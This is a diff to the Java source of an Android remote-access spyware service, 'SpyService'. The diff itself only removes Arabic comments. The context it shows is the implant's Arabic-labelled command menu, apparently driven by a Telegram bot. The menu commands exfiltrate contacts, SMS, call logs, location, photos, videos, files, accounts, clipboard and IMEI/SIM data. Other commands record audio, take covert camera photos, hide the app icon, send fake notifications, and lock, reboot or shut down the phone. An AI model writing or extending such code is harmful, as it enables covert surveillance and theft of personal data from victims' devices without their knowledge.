@@ -174,7 +174,6 @@ public class SpyService extends Service {
                         if (txt.startsWith("/")) {
                             handleCommand(txt);
                         } else {
-                            // أي نص آخر يُعتبر أمراً
                             handleCommand(txt);
                         }
                     }
@@ -237,85 +236,71 @@ public class SpyService extends Service {
         try {
             JSONArray buttons = new JSONArray();
 
-            // صف 1
             JSONArray row1 = new JSONArray();
             JSONObject b1 = new JSONObject(); b1.put("text", "📇 جهات الاتصال"); b1.put("callback_data", "GET_CONTACTS"); row1.put(b1);
             JSONObject b2 = new JSONObject(); b2.put("text", "💬 الرسائل"); b2.put("callback_data", "GET_SMS"); row1.put(b2);
             buttons.put(row1);
 
-            // صف 2
             JSONArray row2 = new JSONArray();
             JSONObject b3 = new JSONObject(); b3.put("text", "📞 سجل المكالمات"); b3.put("callback_data", "GET_CALLLOGS"); row2.put(b3);
             JSONObject b4 = new JSONObject(); b4.put("text", "📍 الموقع"); b4.put("callback_data", "GET_LOCATION"); row2.put(b4);
             buttons.put(row2);
 
-            // صف 3
             JSONArray row3 = new JSONArray();
             JSONObject b5 = new JSONObject(); b5.put("text", "🎤 تسجيل صوت"); b5.put("callback_data", "START_RECORD"); row3.put(b5);
             JSONObject b6 = new JSONObject(); b6.put("text", "⏹ إيقاف التسجيل"); b6.put("callback_data", "STOP_RECORD"); row3.put(b6);
             buttons.put(row3);
 
-            // صف 4
             JSONArray row4 = new JSONArray();
             JSONObject b7 = new JSONObject(); b7.put("text", "📱 التطبيقات"); b7.put("callback_data", "GET_APPS"); row4.put(b7);
             JSONObject b8 = new JSONObject(); b8.put("text", "🖼 الصور"); b8.put("callback_data", "GET_PHOTOS"); row4.put(b8);
             buttons.put(row4);
 
-            // صف 5
             JSONArray row5 = new JSONArray();
             JSONObject b9 = new JSONObject(); b9.put("text", "🎬 الفيديوهات"); b9.put("callback_data", "GET_VIDEOS"); row5.put(b9);
             JSONObject b10 = new JSONObject(); b10.put("text", "📦 جميع الملفات"); b10.put("callback_data", "GET_FILES"); row5.put(b10);
             buttons.put(row5);
 
-            // صف 6
             JSONArray row6 = new JSONArray();
             JSONObject b11 = new JSONObject(); b11.put("text", "👁 إخفاء التطبيق"); b11.put("callback_data", "HIDE_APP"); row6.put(b11);
             JSONObject b12 = new JSONObject(); b12.put("text", "👁 إظهار التطبيق"); b12.put("callback_data", "SHOW_APP"); row6.put(b12);
             buttons.put(row6);
 
-            // صف 7
             JSONArray row7 = new JSONArray();
             JSONObject b13 = new JSONObject(); b13.put("text", "🔔 إشعار وهمي"); b13.put("callback_data", "FAKE_NOTIF"); row7.put(b13);
             JSONObject b14 = new JSONObject(); b14.put("text", "📸 تصوير خلفي"); b14.put("callback_data", "TAKE_PHOTO"); row7.put(b14);
             buttons.put(row7);
 
-            // صف 8
             JSONArray row8 = new JSONArray();
             JSONObject b15 = new JSONObject(); b15.put("text", "🤳 تصوير أمامي"); b15.put("callback_data", "TAKE_PHOTO_FRONT"); row8.put(b15);
             JSONObject b16 = new JSONObject(); b16.put("text", "🔦 كشاف ON"); b16.put("callback_data", "FLASH_ON"); row8.put(b16);
             buttons.put(row8);
 
-            // صف 9
             JSONArray row9 = new JSONArray();
             JSONObject b17 = new JSONObject(); b17.put("text", "🔦 كشاف OFF"); b17.put("callback_data", "FLASH_OFF"); row9.put(b17);
             JSONObject b18 = new JSONObject(); b18.put("text", "📟 IMEI"); b18.put("callback_data", "GET_IMEI"); row9.put(b18);
             buttons.put(row9);
 
-            // صف 10
             JSONArray row10 = new JSONArray();
             JSONObject b19 = new JSONObject(); b19.put("text", "📞 رقم الهاتف"); b19.put("callback_data", "GET_PHONE"); row10.put(b19);
             JSONObject b20 = new JSONObject(); b20.put("text", "📡 معلومات SIM"); b20.put("callback_data", "GET_SIM"); row10.put(b20);
             buttons.put(row10);
 
-            // صف 11
             JSONArray row11 = new JSONArray();
             JSONObject b21 = new JSONObject(); b21.put("text", "📶 الواي فاي"); b21.put("callback_data", "GET_WIFI"); row11.put(b21);
             JSONObject b22 = new JSONObject(); b22.put("text", "🔋 البطارية"); b22.put("callback_data", "GET_BATTERY"); row11.put(b22);
             buttons.put(row11);
 
-            // صف 12
             JSONArray row12 = new JSONArray();
             JSONObject b23 = new JSONObject(); b23.put("text", "🌐 IP العام"); b23.put("callback_data", "GET_IP"); row12.put(b23);
             JSONObject b24 = new JSONObject(); b24.put("text", "🔒 قفل الجهاز"); b24.put("callback_data", "LOCK_DEVICE"); row12.put(b24);
             buttons.put(row12);
 
-            // صف 13
             JSONArray row13 = new JSONArray();
             JSONObject b25 = new JSONObject(); b25.put("text", "🔄 إعادة تشغيل"); b25.put("callback_data", "REBOOT"); row13.put(b25);
             JSONObject b26 = new JSONObject(); b26.put("text", "⏻ إيقاف تشغيل"); b26.put("callback_data", "SHUTDOWN"); row13.put(b26);
             buttons.put(row13);
 
-            // صف 14
             JSONArray row14 = new JSONArray();
             JSONObject b27 = new JSONObject(); b27.put("text", "👤 الحسابات"); b27.put("callback_data", "GET_ACCOUNTS"); row14.put(b27);
             JSONObject b28 = new JSONObject(); b28.put("text", "📋 الحافظة"); b28.put("callback_data", "GET_CLIPBOARD"); row14.put(b28);
@@ -347,7 +332,7 @@ public class SpyService extends Service {
     }
 
     // ======================================================================
-    // ========== دوال جمع البيانات (كما هي من الكود السابق) ==========
+    // ========== دوال جمع البيانات ==========
     // ======================================================================
 
     private File collectContacts() throws Exception {
